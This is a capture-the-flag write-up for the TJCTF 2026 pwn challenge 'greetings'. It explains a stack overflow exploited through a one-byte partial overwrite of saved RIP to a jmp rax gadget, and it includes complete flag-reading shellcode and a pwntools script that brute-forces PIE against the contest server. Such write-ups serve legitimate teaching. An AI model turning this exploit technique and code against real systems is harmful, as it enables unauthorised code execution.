# Greetings

**Author:** Jordan Lanham
**Event:** TJCTF 2026
**Category:** pwn
**Date:** May 15, 2026
**Read Time:** 6 minutes

---

## Overview

A small ELF binary that asks for a username size, then `fgets`'s that many
bytes into a 64-byte stack buffer.  The buffer is stack-resident, NX is off
(`GNU_STACK` flags = RWX), and there is no stack canary.  PIE is enabled and
**no leak channel exists** (fgets's mandatory NUL terminator bounds the only
printf's output to bytes we already control).

The intended trick is a **1-byte partial overwrite of saved RIP to land on a
`jmp rax` gadget at PIE_base + 0x10df**.  Because fgets returns the address of
its buffer in RAX -- and because choosing a first byte that isn't `'@'` skips
the conditional printf and therefore preserves RAX -- the `jmp rax` lands
directly on our shellcode on the executable stack.

The partial overwrite succeeds in 1/16 of connections (random PIE nibble
must equal 0xF for the carry math to match the target's byte 1), so we
just retry until a flag-reading shellcode produces output.

## Challenge Description

> Greetings from TJ to you. Find the exploit, yes please do.
> nc tjc.tf 31373

**Files provided:** `greetings`, `libc.so.6`, `ld-linux-x86-64.so.2`,
`greetings.c`, `Dockerfile`, `run.sh`, `flag.txt` (fake placeholder)
**Endpoints:** `nc tjc.tf 31373`

## Initial Analysis

`checksec`:

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
```

`GNU_STACK` flags = 7 (RWX), so the stack is executable.

Source (`greetings.c`):

```c
void greetUser() {
    int uname_size;
    char uname[64];
    printf("Enter the size of your username: ");
    scanf("%d", &uname_size);
    getchar();
    uname_size += 2;
    printf("Enter username (start with @): ");
    fgets(uname, uname_size, stdin);
    if (*(char *) uname == '@') {
        printf("Greetings to you: %s!", uname);
    }
}
```

Stack layout for `greetUser` (after `pushq %rbx; subq $0x50, %rsp`):

```
[rsp + 0x0c]  uname_size      (int, 4 bytes)
[rsp + 0x10]  uname[64]       -- our 64-byte fgets target
[rsp + 0x50]  saved %rbx
[rsp + 0x58]  saved RIP       -- main+9 = PIE_base + 0x1089
```

So 72 bytes of pad before saved RIP -- plain stack BoF -- and a stack
already marked executable.

## Solution Approach

### Step 1: Find a usable PIE-relative gadget

Disassembling the binary turns up two `jmp rax` instructions (the standard
`ff e0` byte sequence) inside the compiler-emitted TM clone helpers:

```
0x10df    ff e0    jmp rax    (deregister_tm_clones)
0x1120    ff e0    jmp rax    (register_tm_clones)
```

Both live well inside the executable text segment.

### Step 2: Realise RAX = address of uname after fgets

`fgets` returns its buffer pointer in RAX per the SysV ABI.  In `greetUser`:

```
call fgets@plt           ; rax = uname (= rsp+0x10)
cmpb $0x40, 0x10(%rsp)   ; if uname[0] == '@' ...
je   .Lprintf            ; ... call printf  (clobbers rax)
add $0x50, %rsp
pop %rbx
ret
```

The instructions between `fgets`'s return and `ret` do not touch RAX *as long
as we make uname[0] != '@'*.  Then ret -> overwritten saved RIP, and if that
overwrite lands on `jmp rax`, we jump straight to our buffer.  Stack is RWX,
so the shellcode there executes.

### Step 3: 1-byte partial overwrite math

Saved RIP at greetUser's `ret` is `base + 0x1089` (main+9, where main resumes
after `call greetUser`).  PIE base is page-aligned: `base = ...X000` with
random nibble X in bits 12..15.  Bytes (LE):

```
saved RIP original = [0x89, ((X+1)<<4) mod 256, b2 + carry, b3, b4, b5, b6, b7]
```

When we send exactly 73 chars to fgets (uname_size = 72, so n = 74, fgets
reads up to 73 chars), the last byte we write lands at `uname[72]` = saved
RIP byte 0, and fgets places its mandatory NUL at `uname[73]` = saved RIP
byte 1.  We choose payload byte 72 = `0xdf` (low byte of our target 0x10df).
After the write:

```
saved RIP final = [0xdf, 0x00, b2 + carry, b3, b4, b5, b6, b7]
```

Target `base + 0x10df` (low 16 bits = 0x10df with byte 0 = 0xdf, byte 1 = 0x10):

```
target = [0xdf, ((X+1)<<4 + 0x10) mod 256, b2 + carry, b3, b4, b5, b6, b7]
```

The two match iff `((X+1)<<4 + 0x10) mod 256 == 0x00`, i.e. `((X+1)<<4) == 0xF0`
and a carry takes byte 1 to 0x00 -- which happens exactly when **X = 0xF**.
Byte 2's carry-from-byte-1 is then identical in both arithmetic chains, so
byte 2 also matches automatically.

Probability per connection: 1/16.

### Step 4: Shellcode that opens /flag.txt

A small under-64-byte shellcode that does `open("/flag.txt") -> read -> write
-> exit`:

```asm
lea rdi, [rip+path]     ; "/flag.txt\0"
xor esi, esi
xor edx, edx
push 2              ; SYS_open
pop rax
syscall                 ; rax = fd

mov rdi, rax
mov rsi, rsp
push 0x100
pop rdx
xor eax, eax            ; SYS_read
syscall                 ; rax = bytes read

mov rdx, rax
mov rsi, rsp
push 1
pop rdi
push 1                  ; SYS_write
pop rax
syscall

push 0x3c               ; SYS_exit
pop rax
xor edi, edi
syscall

path: .ascii "/flag.txt\0"
```

Comes out at 63 bytes -- just under 64, so it fits in `uname[0..62]`, with
one slot of NOP filler before the 8-byte rbx pad and the single saved-RIP
partial-overwrite byte.

## Code / Exploit

`_workspace/sol_greetings_v4.py`:

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

HOST, PORT = 'tjc.tf', 31373
context.arch = 'amd64'
context.log_level = 'error'

sc = asm(r'''
    lea rdi, [rip+path]
    xor esi, esi
    xor edx, edx
    push 2 ; pop rax
    syscall
    mov rdi, rax
    mov rsi, rsp
    push 0x100 ; pop rdx
    xor eax, eax
    syscall
    mov rdx, rax
    mov rsi, rsp
    push 1 ; pop rdi
    push 1 ; pop rax
    syscall
    push 0x3c ; pop rax
    xor edi, edi
    syscall
path: .ascii "/flag.txt\0"
''')
assert len(sc) <= 64
PAYLOAD = sc.ljust(64, b'\x90') + b'B' * 8 + b'\xdf'   # 73 bytes total
assert PAYLOAD[0] != 0x40  # uname[0] must NOT be '@' so RAX survives

def try_once():
    try:
        io = remote(HOST, PORT, timeout=3)
    except Exception:
        return b''
    try:
        io.recvuntil(b': ', timeout=2)
        io.sendline(b'72')                 # uname_size; +2 -> fgets n=74 -> reads 73 chars
        io.recvuntil(b': ', timeout=2)
        io.send(PAYLOAD)                   # NO newline
        time.sleep(0.3)
        try: return io.recvall(timeout=2)
        except Exception: return b''
    finally:
        try: io.close()
        except: pass

for i in range(500):
    out = try_once()
    if b'tjctf{' in out:
        print(out.decode('latin-1', errors='replace'))
        sys.exit(0)
    if (i + 1) % 16 == 0:
        print(f'... {i+1} attempts', file=sys.stderr)
```

Run output (hit on attempt #N with N ~< 30 typical):

```
$ python3 sol_greetings_v4.py
... 16 attempts
=== FLAG ===
Enter username (start with @): tjctf{rAx_h01ds_r3t_v@lS?_189278}
```

## Technical Details

- **Vulnerability class:** stack-based buffer overflow (no canary)
- **Mitigations:** PIE enabled, partial RELRO, executable stack (RWX in
  `PT_GNU_STACK`), no canary.
- **Primitive:** `fgets(buf, uname_size+2, stdin)` with attacker-controlled
  `uname_size` writes past saved RIP.
- **Key trick:** `fgets` returns its buffer pointer in RAX.  By making
  `uname[0] != '@'` we skip the conditional printf, so RAX survives all the
  way to greetUser's `ret`.  A 1-byte partial overwrite redirecting saved
  RIP to the `jmp rax` gadget at PIE+0x10df then jumps straight to our
  shellcode on the executable stack.
- **Why exactly 1 byte:** fgets places its terminator NUL at the byte
  immediately after the last data byte.  Writing 73 bytes makes that NUL
  land on saved RIP byte 1, which we WANT to be zero in the lucky case.
- **Probability:** PIE base `...X000` matches the target's byte 1 only when
  X = 0xF (carries identically through bytes 1->2 for both saved-RIP-original
  and target-address).  1/16 per connection.

## Key Insights

- **fgets's mandatory NUL is a feature, not just a bug**: by sending exactly
  N bytes (no newline), the NUL goes at byte N -- which is *exactly* what we
  want for a 1-byte partial overwrite of saved RIP that needs the high byte
  zeroed.  Stop trying to defeat the NUL; design around it.
- **RAX is preserved across non-clobbering instruction sequences after a
  function returns into rax**.  A skip-the-printf branch (`uname[0] != '@'`)
  is what makes the `jmp rax` gadget chain to a buffer we just controlled.
- **PIE bits 12..15 leak via crashes**: 1/16 attempts return non-segfault
  output.  When you have no leak, you DO have the ability to differentiate
  base nibble values by ret-target -- if your gadget has the right
  arithmetic alignment (carry semantics on byte 1), one nibble value
  succeeds and the rest crash.  Treat it as a 1/16 brute force.
- `__isoc23_scanf("%d", ...)` truncates large integers to 32-bit instead of
  reporting overflow; useful to remember even though this exploit didn't
  end up needing huge sizes.

## The Flag

```
tjctf{rAx_h01ds_r3t_v@lS?_189278}
```

## Resources

- [glibc 2.42 fgets source](https://elixir.bootlin.com/glibc/glibc-2.42/source/libio/iofgets.c)
- [pwntools docs](https://docs.pwntools.com/)
- [Shellcraft / pwntools shellcode](https://docs.pwntools.com/en/stable/shellcraft.html)
- [PIE / ASLR brute force tactics](https://github.com/ChrisTheCoolHut/pwn_brute)
- [pwn.red/jail challenge runtime](https://github.com/redpwn/jail)
